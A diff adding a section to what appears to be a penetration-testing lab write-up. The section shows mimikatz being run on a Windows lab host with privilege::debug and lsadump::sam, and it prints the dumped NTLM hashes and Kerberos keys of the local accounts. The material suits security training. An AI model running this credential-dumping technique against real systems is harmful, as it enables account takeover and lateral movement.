@@ -2258,3 +2258,117 @@ type flag.txt
 33a9d46de4015e7b3b0ad592a9394720
 ```
 
+running mimikatz:
+
+```
+c:\Users\ilfserveradm\Desktop>.\mimikatz
+.\mimikatz
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # lsadump::sam
+Domain : ACADEMY-AEN-MS0
+SysKey : 61b3d49a6205a1dedb14591c22d36afc
+Local SID : S-1-5-21-1020326033-369054202-3290056218
+
+SAMKey : 93454d09b81d64dc5dc4710d08562175
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 0850f84bbd902729bb3af737405cc788
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : f14b84784180c57a571f0447e229f9c6
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : ACADEMY-AEN-MS01.INLANEFREIGHT.LOCALAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 1484bb4178abdc367dd900f53920cdd8d4fce261027627ad6b490b8a26bedb9a
+      aes128_hmac       (4096) : 1d645f67cbebf1111e9d4cd1624e632e
+      des_cbc_md5       (4096) : 236767e601c2ab57
+    OldCredentials
+      aes256_hmac       (4096) : a7be6e113dde09c7c8ab20ab33d0110351a06aca7770adc2ab7adc5a3476c31d
+      aes128_hmac       (4096) : 66150075fbb3b2b6197fed9538538c36
+      des_cbc_md5       (4096) : d51cdf6438e91f7a
+    OlderCredentials
+      aes256_hmac       (4096) : a394ab9b7c712a9e0f3edb58404f9cf086132d29ab5b796d937b197862331b07
+      aes128_hmac       (4096) : 7630dab9bdaeebf9b4aa6c595347a0cc
+      des_cbc_md5       (4096) : 9876615285c2766e
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : ACADEMY-AEN-MS01.INLANEFREIGHT.LOCALAdministrator
+    Credentials
+      des_cbc_md5       : 236767e601c2ab57
+    OldCredentials
+      des_cbc_md5       : d51cdf6438e91f7a
+
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+  Hash NTLM: 4b4ba140ac0767077aee1958e7f78070
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 92793b2cbb0532b4fbea6c62ee1c72c8
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WDAGUtilityAccount
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : c34300ce936f766e6b0aca4191b93dfb576bbe9efa2d2888b3f275c74d7d9c55
+      aes128_hmac       (4096) : 6b6a769c33971f0da23314d5cef8413e
+      des_cbc_md5       (4096) : 61299e7a768fa2d5
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WDAGUtilityAccount
+    Credentials
+      des_cbc_md5       : 61299e7a768fa2d5
+
+
+RID  : 000003ea (1002)
+User : ilfserveradm
+  Hash NTLM: 22712976f35dc45157952a07c7ffc774
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 097a1ff766ac53e31d7112b23b4b1843
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : ACADEMY-AEN-MS01.INLANEFREIGHT.LOCALilfserveradm
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 6b23b9ccd917d962bd42fc4168f7e037b67863ea4477bf8cd107b57817a4de29
+      aes128_hmac       (4096) : 30e80864c09d79f23afae50b8d00bb54
+      des_cbc_md5       (4096) : e091a1c80b574c15
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : ACADEMY-AEN-MS01.INLANEFREIGHT.LOCALilfserveradm
+    Credentials
+      des_cbc_md5       : e091a1c80b574c15
+
+```
